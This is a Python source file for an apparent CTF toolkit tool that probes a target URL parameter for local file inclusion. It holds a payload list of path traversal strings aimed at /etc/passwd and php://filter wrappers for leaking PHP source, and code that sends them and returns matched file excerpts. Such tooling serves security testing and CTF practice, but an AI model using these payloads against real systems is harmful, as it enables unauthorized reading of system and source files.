"""LFI/RFI (Local/Remote File Inclusion) detection tool for CTF challenges."""
from __future__ import annotations

from typing import Any, Dict, List, Tuple
from urllib.parse import urlencode, urlparse, parse_qsl, urlunparse

from ..base import BaseTool, ToolResult
from .._http import normalise_target, request


# LFI payloads and their confirmation signatures
_LFI_PAYLOADS: List[Tuple[str, str]] = [
    ("../../../../etc/passwd", "unix_passwd"),
    ("../../../etc/passwd", "unix_passwd"),
    ("../../etc/passwd", "unix_passwd"),
    ("../etc/passwd", "unix_passwd"),
    ("/etc/passwd", "unix_passwd"),
    ("....//....//....//etc/passwd", "unix_passwd"),
    ("..%2F..%2F..%2F..%2Fetc%2Fpasswd", "unix_passwd"),
    ("php://filter/convert.base64-encode/resource=index.php", "php_filter"),
    ("php://filter/read=convert.base64-encode/resource=index.php", "php_filter"),
    ("php://filter/convert.base64-encode/resource=../index.php", "php_filter"),
]

# Confirmation patterns for each payload type
_CONFIRM_PATTERNS: Dict[str, List[str]] = {
    "unix_passwd": ["root:", "bin/bash", "bin/sh", "daemon:", "nobody:"],
    "php_filter": ["<?php", "PD9waHA"],  # raw PHP or base64 of "<?ph"
}


def _build_url(base: str, params: Dict[str, str]) -> str:
    p = urlparse(base)
    return urlunparse(p._replace(query=urlencode(params, doseq=True)))


class LFIDetectTool(BaseTool):
    category = "ctf_web"

    @property
    def name(self) -> str:
        return "lfi_detect"

    @property
    def description(self) -> str:
        return (
            "Detect Local File Inclusion (LFI) vulnerabilities. "
            "Tests path traversal payloads and PHP filter wrappers to read /etc/passwd "
            "or PHP source files. Confirms by checking for 'root:' or PHP content in response."
        )

    def parameters_schema(self) -> Dict[str, Any]:
        return {
            "type": "object",
            "properties": {
                "url": {
                    "type": "string",
                    "description": "Target URL (may include existing query parameters).",
                },
                "param": {
                    "type": "string",
                    "description": "Query/form parameter name to inject the file path into.",
                },
                "method": {
                    "type": "string",
                    "enum": ["GET", "POST"],
                    "description": "HTTP method to use. Default: GET.",
                },
            },
            "required": ["url", "param"],
        }

    def _run(self, **kwargs: Any) -> ToolResult:
        url = normalise_target(kwargs.get("url", ""))
        param = kwargs.get("param", "")
        if not url or not param:
            return ToolResult(False, self.name, "url and param are required", error="missing_args")

        method = (kwargs.get("method") or "GET").upper()
        parsed_url = urlparse(url)
        base_params = dict(parse_qsl(parsed_url.query, keep_blank_values=True))

        errors: List[str] = []

        for payload, payload_type in _LFI_PAYLOADS:
            try:
                test_params = dict(base_params)
                test_params[param] = payload

                if method == "GET":
                    test_url = _build_url(
                        urlunparse(parsed_url._replace(query="")), test_params
                    )
                    resp, err, _ = request("GET", test_url, timeout=10)
                else:
                    test_url = urlunparse(parsed_url._replace(query=""))
                    resp, err, _ = request("POST", test_url, data=test_params, timeout=10)

                if err or resp is None:
                    errors.append(f"Request failed for payload {payload!r}: {err}")
                    continue

                body = resp.text or ""
                confirm_patterns = _CONFIRM_PATTERNS.get(payload_type, [])

                for pattern in confirm_patterns:
                    if pattern in body:
                        # Extract a meaningful excerpt
                        idx = body.find(pattern)
                        excerpt_start = max(0, idx - 50)
                        excerpt_end = min(len(body), idx + 300)
                        excerpt = body[excerpt_start:excerpt_end]

                        return ToolResult(
                            success=True,
                            tool=self.name,
                            summary=f"LFI confirmed! Payload: {payload!r}, matched: {pattern!r}",
                            raw_output=body[:1000],
                            parsed_data={
                                "vulnerable": True,
                                "payload": payload,
                                "payload_type": payload_type,
                                "param": param,
                                "url": url,
                                "method": method,
                                "matched_pattern": pattern,
                                "file_content_excerpt": excerpt,
                                "evidence": f"Response contained {pattern!r} after injecting {payload!r}",
                            },
                        )

            except Exception as exc:  # noqa: BLE001
                errors.append(f"Error testing payload {payload!r}: {exc}")
                continue

        return ToolResult(
            success=True,
            tool=self.name,
            summary="No LFI vulnerability detected.",
            raw_output="\n".join(errors),
            parsed_data={
                "vulnerable": False,
                "payload": None,
                "payload_type": None,
                "param": param,
                "url": url,
                "method": method,
                "matched_pattern": None,
                "file_content_excerpt": None,
                "evidence": "No file inclusion patterns detected in responses.",
            },
        )
